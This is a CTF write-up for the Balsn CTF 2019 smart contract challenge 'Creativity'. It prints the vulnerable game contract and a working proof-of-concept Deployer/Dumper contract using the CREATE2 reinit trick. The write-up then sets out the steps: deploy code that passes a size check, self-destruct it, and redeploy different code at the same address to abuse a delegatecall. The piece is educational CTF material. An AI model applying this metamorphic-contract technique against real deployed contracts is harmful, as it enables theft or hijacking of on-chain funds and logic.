# Challenge

`Creativity` is one of my two smart contract challenges for [Balsn CTF 2019](https://github.com/balsn/balsn-ctf-2019). You may find the source files [here](https://github.com/x9453/balsn-ctf-2019).

* Type: Smart contract
* Solves: 1/720

# Description

> Be concise, or be creative.

# Solution

## TL;DR

In this challenge, our goal is to emit the `SendFlag` event. According to the [CREATE2 reinit trick](https://ethereum-magicians.org/t/potential-security-implications-of-create2-eip-1014/2614), we can deploy a contract that passes the `check()`, self-destruct it, and then deploy a new contract at the same address with different code. Let our new contract emit the `SendFlag` event, which will be executed by the delegatecall from the game contract when `execute()` is called.

## Detailed Write-up

We are provided with the game contract source:

```javascript=
pragma solidity ^0.5.10;

contract Creativity {
    event SendFlag(address addr);
    
    address public target;
    uint randomNumber = 0;
    
    function check(address _addr) public {
        uint size;
        assembly { size := extcodesize(_addr) }
        require(size > 0 && size <= 4);
        target = _addr;
    }
    
    function execute() public {
        require(target != address(0));
        target.delegatecall(abi.encodeWithSignature(""));
        selfdestruct(address(0));
    }
    
    function sendFlag() public payable {
        require(msg.value >= 100000000 ether);
        emit SendFlag(msg.sender);
    }
}
```

Unfortunately, we don't have that much ether to call `sendFlag` directly, so let's first try to follow the logic of the game contract:

1. Deploy a contract with its code size not more than 4 bytes.
2. Call `check()` with the address of the deployed contract as the parameter.
3. Call `execute()` to let the game contract make a [delegatecall](https://solidity.readthedocs.io/en/v0.5.12/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries) to our deployed contract.

The biggest problem is: How can we emit the `SendFlag` event by executing at most 4 bytes of EVM bytecode? The short answer is no, we can't. Or at least in the [Constantinople hard-fork](https://blog.ethereum.org/2019/02/22/ethereum-constantinople-st-petersburg-upgrade-announcement/), the latest release of Ethereum when the CTF is held in Oct 2019.

In short, the reasons are:

1. Directly emit an event with `LOG1` requires an event topic hash as a parameter, which is more than 4 bytes. ([Ref](https://solidity.readthedocs.io/en/v0.5.12/contracts.html#low-level-interface-to-logs))
2. To invoke any type of call to another contract, at least 6 parameters should be prepared on the stack, which requires at least 6 operations and thus 6 bytes of code. ([Ref](https://ethervm.io/))
3. Modifying the storage of the game contract is useless since there is a selfdestruct right after the delegatecall.

### The CREATE2 Trick

The `CREATE2` opcode proposed in [EIP-1014](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1014.md) behaves identically the same as `CREATE`, except the calculated address for the deployed contract. This [discussion thread](https://ethereum-magicians.org/t/potential-security-implications-of-create2-eip-1014/2614) points out a critical security issue of `CREATE2`, the so-called `CREATE2` reinit trick, which allows a contract to change in-place after being deployed. You may find a detailed explanation in the link above.

Here is a simple PoC of the `CREATE2` reinit trick (re-written from [this contract](https://ropsten.etherscan.io/address/0xb3ecef15f61572129089a9704b33d53f56991df8#code)). All contracts deployed by `deploy(code)` through `Deployer` will be deployed at the same address. However, the code of these contracts can be different.

```javascript=
pragma solidity ^0.5.10;

contract Deployer {
    bytes public deployBytecode;
    address public deployedAddr;
    
    function deploy(bytes memory code) public {
        deployBytecode = code;
        address a;
        // Compile Dumper to get this bytecode
        bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe';
        assembly {
            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x9453)
        }
        deployedAddr = a;
    }
}

contract Dumper {
    constructor() public {
        Deployer dp = Deployer(msg.sender);
        bytes memory bytecode = dp.deployBytecode();
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
    }
}
```

To solve this challenge, this is our plan:

1. Using the `CREATE2` reinit trick, deploy a contract with content `0x33ff`, which is `selfdestruct(msg.sender)`.
2. Call `check()` in the game contract to let our deployed contract pass the check.
3. Send an empty transaction to our contract to make it self-destructed.
4. Again, using the `CREATE2` reinit trick, deploy a new contract at the same address that will execute `emit SendFlag(0)`.
5. Call `execute()`in the game contract, it will then fire the `SendFlag` event.

# Misc

Congrats to @Sissel for being the only person who solved my two challenges during the CTF! I hope all of you enjoy this challenge and Balsn CTF.
